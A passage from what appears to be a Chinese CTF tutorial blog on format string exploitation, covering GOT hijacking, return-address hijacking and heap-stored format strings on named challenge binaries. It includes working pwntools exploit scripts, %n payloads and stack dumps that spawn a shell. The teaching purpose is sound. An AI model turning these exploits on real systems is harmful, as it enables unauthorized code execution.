 p.sendline(<span class="string">&quot;put&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;upload:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;ftp&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;get&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;get:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showlist</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;ftp&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;rxraclhm&quot;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;puts_got:&quot;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Rainism):&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&quot;%8$s&quot;</span> + p32(puts_got)</span><br><span class="line">creat(<span class="string">&#x27;aaaa&#x27;</span>,payload)</span><br><span class="line">show(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line">onegadget = libc_base + <span class="number">0x3ac62</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1:overcover puts@got 2 system@got</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = fmtstr_payload(7, &#123;puts_got: system&#125;)</span></span><br><span class="line"><span class="comment">#creat(&#x27;/bin/sh;&#x27;, payload)</span></span><br><span class="line"><span class="comment">#show(&#x27;/bin/sh;&#x27;)</span></span><br><span class="line"><span class="comment">#showlist()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2:overcover puts@got 2 onegadget</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: onegadget&#125;)</span><br><span class="line">creat(<span class="string">&#x27;bbbb&#x27;</span>, payload)</span><br><span class="line">show(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>exp 替换我写得版本，这条题目的完整 WP ：<a href="example%5Cfmtstr_example%5Chijack_GOT%5C2016_CCTF_pwn3_writeup.md">2016_CCTF_pwn3_writeup</a></p>
</blockquote>
<p>注意</p>
<ul>
<li><p>我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。</p>
<p><strong>注解</strong>：结合 payload 来看：<code>payload = &quot;%8$s&quot; + p32(puts_got)</code> ，<code>%8$S</code>长度为 0x4 ，偏移为 7；<code>p32(puts_got)</code> 长度为 0x4 ，偏移为 8 ;</p>
</li>
<li><p>这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。</p>
</li>
</ul>
<h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p>
<h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">三个白帽 - pwnme_k0</a> 为例进行分析。</p>
<h4 id="确定保护-2"><a href="#确定保护-2" class="headerlink" title="确定保护"></a>确定保护</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以看出程序主要开启了 NX 保护以及 Full RELRO 保护。这我们就没有办法修改程序的 got 表了。</p>
<h4 id="分析程序-2"><a href="#分析程序-2" class="headerlink" title="分析程序"></a>分析程序</h4><p>简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_400B07@&lt;eax&gt;(<span class="keyword">char</span> format@&lt;dil&gt;, <span class="keyword">char</span> formata, __int64 a3, <span class="keyword">char</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;a4 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其输出的内容为 &amp;a4 + 4。我们回溯一下，发现我们读入的 password 内容也是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6 = read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;a4 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br></pre></td></tr></table></figure>

<p>当然我们还可以发现我们读入的 username 在距离的 password 20 个字节。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your username(max lenth:20): &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v8 = read(<span class="number">0</span>, &amp;bufa, <span class="number">0x14</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v8 &amp;&amp; v8 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your password(max lenth:20): &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v6 = read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;a4 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)buf = bufa;</span><br><span class="line">    *(_QWORD *)(buf + <span class="number">8</span>) = a3;</span><br><span class="line">    *(_QWORD *)(buf + <span class="number">16</span>) = a4;</span><br></pre></td></tr></table></figure>

<p>好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用 system(‘bin/sh’) 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。</p>
<p>虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。</p>
<p><strong>注解</strong>：</p>
<p>上面这句话可以这样理解：有一个独立函数 A 的栈帧，这个 A 栈帧整体存放地址是动态变化的。但是 A 栈帧内部的结构是固定的，举个例子：rbp 一定在 rip 前面（低地址）。还有我们知道的是 rbp 存储的是上一个栈帧的 rbp 地址，如果说每次都是通过函数 B 调用函数 A ，因为AB 栈帧长度&amp;结构固定，我们就可以通过泄露函数 A rbp 的值减去偏移得到函数 A rip 地址。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_3.png" alt="fmrstr_3.png"></p>
<p>利用思路如下</p>
<ul>
<li>确定偏移</li>
<li>获取函数的 rbp 与返回地址</li>
<li>根据相对偏移获取存储返回地址的地址</li>
<li>将执行 system 函数调用的地址写入到存储返回地址的地址。</li>
</ul>
<h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&amp;a4 + 4) 函数处</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Register Account first!</span><br><span class="line">Input your username(max lenth:20): </span><br><span class="line">aaaaaaaa</span><br><span class="line">Input your password(max lenth:20): </span><br><span class="line"><span class="meta">%</span><span class="bash">p%p%p%p%p%p%p%p%p%p</span></span><br><span class="line">Register Success!!</span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit sangebaimao:(</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">error options</span></span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit sangebaimao:(</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>此时栈的情况为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">     0x400b1a                  call   0x400758</span><br><span class="line">     0x400b1f                  lea    rdi, [rbp+0x10]</span><br><span class="line">     0x400b23                  mov    eax, 0x0</span><br><span class="line"> →   0x400b28                  call   0x400770</span><br><span class="line">   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0</span><br><span class="line">        0x400776                  xchg   ax, ax</span><br><span class="line">        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8</span><br><span class="line">        0x40077e                  xchg   ax, ax</span><br><span class="line">────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp</span><br><span class="line">0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30</span><br><span class="line">0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi</span><br><span class="line">0x00007fffffffdb58│+0x18: 0x000000000000000a</span><br><span class="line">0x00007fffffffdb60│+0x20: 0x7025702500000000</span><br><span class="line">0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2</span><br></pre></td></tr></table></figure>

<p>可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。</p>
<p><strong>注解</strong>：</p>
<p>这里我还是用我习惯的方法，输出几个 %p 直接数出来偏移。</p>
<h4 id="修改地址"><a href="#修改地址" class="headerlink" title="修改地址"></a>修改地址</h4><p>我们再仔细观察下断点（b printf）处栈的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp</span><br><span class="line">0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30</span><br><span class="line">0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi</span><br><span class="line">0x00007fffffffdb58│+0x18: 0x000000000000000a</span><br><span class="line">0x00007fffffffdb60│+0x20: 0x7025702500000000</span><br><span class="line">0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2</span><br></pre></td></tr></table></figure>

<p>可以看到栈上第二个位置存储的就是该函数的返回地址 (其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。</p>
<p>与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_3.png" alt="fmrstr_3.png"></p>
<p>0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。</p>
<p>这里需要说明的是<strong>在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash</strong>, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system(“/bin/sh”) 处</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008A6 sub_4008A6      proc near</span><br><span class="line">.text:00000000004008A6 ; __unwind &#123;</span><br><span class="line">.text:00000000004008A6                 push    rbp</span><br><span class="line">.text:00000000004008A7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004008AA &lt;- here         mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004008AF                 call    system</span><br><span class="line">.text:00000000004008B4                 pop     rdi</span><br><span class="line">.text:00000000004008B5                 pop     rsi</span><br><span class="line">.text:00000000004008B6                 pop     rdx</span><br><span class="line">.text:00000000004008B7                 retn</span><br></pre></td></tr></table></figure>

<h4 id="利用程序-1"><a href="#利用程序-1" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : pwnme_k0.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack addr</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + <span class="string">&quot;%6$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b printf&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x38</span></span><br><span class="line">log.info(<span class="string">&quot;stack_leak:&quot;</span>+<span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack retaddr</span></span><br><span class="line">payload1 = p64(stack_leak)</span><br><span class="line">payload2 = <span class="string">&quot;%2218d%8$hn&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>注解</strong>：</p>
<ol>
<li>泄露地址的时候使用格式化字符串用的是 %p ，如果用 %s 再 u64 泄露出来的是函数 B 的 rbp 的值。原因也很简单，要求输出的是字符，系统到函数 A rbp 的值指向的地址取值，也就是函数 B 的值。如果是 %p 就将函数 A rbp 的值输出。</li>
<li>hijack 部分的 payload ，格式化字符串可以放到 name 输入，也就是和 stack_leak 一起输入，password 就随便输入点东西行了。这里因为输入长度现在，所以没有使用最稳妥的 单字节 输入，而是双字节。</li>
</ol>
<h2 id="堆上的格式化字符串漏洞"><a href="#堆上的格式化字符串漏洞" class="headerlink" title="堆上的格式化字符串漏洞"></a>堆上的格式化字符串漏洞</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。（出现情况就像下面例子，格式化字符串本身存储在堆上，字符指针指向栈上，出现的情况是我们不能容易控制写入的地址）</p>
<h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 2015 年 CSAW 中的 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">contacts</a> 为例进行介绍。</p>
<h4 id="确定保护-3"><a href="#确定保护-3" class="headerlink" title="确定保护"></a>确定保护</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  2015-CSAW-contacts git:(master) ✗ checksec contacts</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看出程序不仅开启了 NX 保护还开启了 Canary。（RELRO 半保护，我们是不是能 hijack got 表呢？hijack retaddr 呢？）</p>
<h4 id="分析程序-3"><a href="#分析程序-3" class="headerlink" title="分析程序"></a>分析程序</h4><p>简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在打印联系人信息的时候存在格式化字符串漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">PrintInfo</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">char</span> *format)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tName: %s\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tLength %u\n&quot;</span>, a2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tPhone #: %s\n&quot;</span>, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tDescription: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);	<span class="comment">//格式化字符串漏洞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仔细看看，可以发现这个 format 其实是指向堆中的。</p>
<p><strong>注解</strong>：可以从调用 PrintInfo 的上层函数查看最后一个参数：（v2 是结构体链表）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_8048BD1(v2 + <span class="number">8</span>, *(_DWORD *)(v2 + <span class="number">72</span>), *(_DWORD *)(v2 + <span class="number">4</span>), *(<span class="keyword">char</span> **)v2);</span><br></pre></td></tr></table></figure>

<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>我们的基本目的是获取系统的 shell，从而拿到 flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持 got 表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下</p>
<ul>
<li><p>之所以不能够劫持 got 来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有 printf 函数，我们只有选择它才可以构造 /bin/sh 让它执行 system(‘/bin/sh’)，但是 printf 函数在其他地方也均有用到，这样做会使得程序直接崩溃。</p>
<p><strong>注解</strong></p>
<p>换句人话就是：在这个程序中，我们能控制输入参数的函数就只有 printf ，诸如 puts 等的参数都是我们不可控的。因为修改 got 表之后我们需要传入 binsh 的地址，所以只能选择 printf 。但是选择 printf 又有一个问题，我们修改完后，printf 各个地方都会用到，还没运行到我们能输入参数的地方，程序就已经挂逼了。</p>
<p>这里还有一个原因 wiki 中没有提及，那就是我们不能直接控制写入地址。原因很简单：通过分析程序知道，格式化字符串是存放在堆上，而字符串指针是在栈上，很明显的现象就是栈上不是字符串的明文，而是字符串的堆地址，就算我们在格式化字符串中输入目标地址，也不能通过偏移获取。（这个程序全部可控输入都放在堆上）我们不能直接控制输入目标地址，找栈上现有的地址。</p>
<p>超长偏移能取到值？我们当它是可行的试一试，格式化字符串到描述堆块相差 <code>-0xf7fafed0</code> ，偏移为 <code>-1040105396</code> ，构造尝试一下：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_4.png" alt="fmrstr_4.png"></p>
</li>
<li><p>其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入 system_addr + ‘bbbb’ + addr of ‘/bin/sh‘ 似乎并不现实。</p>
<p><strong>注解</strong>：</p>
<p>换句人话就是：我们不能直接控制目标地址，只能在栈上通过偏移找地址，而栈上没有指向 eip 的地方，也就找不到 eip 地址，就不能修改 eip 的值。</p>
</li>
</ul>
<p><strong>注解</strong>：</p>
<p>就因为我们不能直接控制目标地址，所以不能用 hijack GOT 、hijack retaddr 。</p>
<p>那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack pivoting。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过 leave 指令来进行栈迁移，所以在迁移之前我们需要修改程序保存 ebp 的值为我们想要的值。 只有这样在执行 leave 指令的时候， esp 才会成为我们想要的值。（leave 指令等于：<code>mov esp,ebp;pop ebp;</code>）</p>
<p>同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存 ebp 的地址为多少，而这时 PrintInfo 函数中存储 ebp 的地址每次都在变化，而我们也无法通过其他方法得知。但是，<strong>程序中压入栈中的 ebp 值其实保存的是上一个函数的保存 ebp 值的地址</strong>，所以我们可以修改其<strong>上层函数的保存的 ebp 的值，即上上层函数（即 main 函数）的 ebp 数值</strong>。这样当上层程序返回时，即实现了将栈迁移到堆的操作。</p>
<p>基本思路如下</p>
<ul>
<li><p>首先获取 system 函数的地址</p>
<ul>
<li>通过泄露某个 libc 函数的地址根据 libc database 确定。</li>
</ul>
</li>
<li><p>构造基本联系人描述为 system_addr + ‘bbbb’ + binsh_addr</p>
</li>
<li><p>修改上层函数保存的 ebp(即上上层函数的 ebp) 为<strong>存储 system_addr 的地址 -4</strong>。</p>
<p><strong>注解</strong>：</p>
<p>为什是<strong>system_addr 的地址 -4</strong> ？是因为程序末尾的 <code>leave;ret</code> 执行完 <code>leave</code> 后，esp 是指向 ebp 的，然后 esp 的值会增加一个机器长度（这时 esp 刚好是指向 eip ），再执行 ret 将 esp 指向的值压入 eip 中。</p>
</li>
<li><p>当主程序返回时，会有如下操作（第一第二合并等于 <code>leave</code> ）</p>
<ul>
<li>move esp,ebp，将 esp 指向 system_addr 的地址 - 4</li>
<li>pop ebp， 将 esp 指向 system_addr</li>
<li>ret，将 eip 指向 system_addr，从而获取 shell。</li>
</ul>
</li>
</ul>
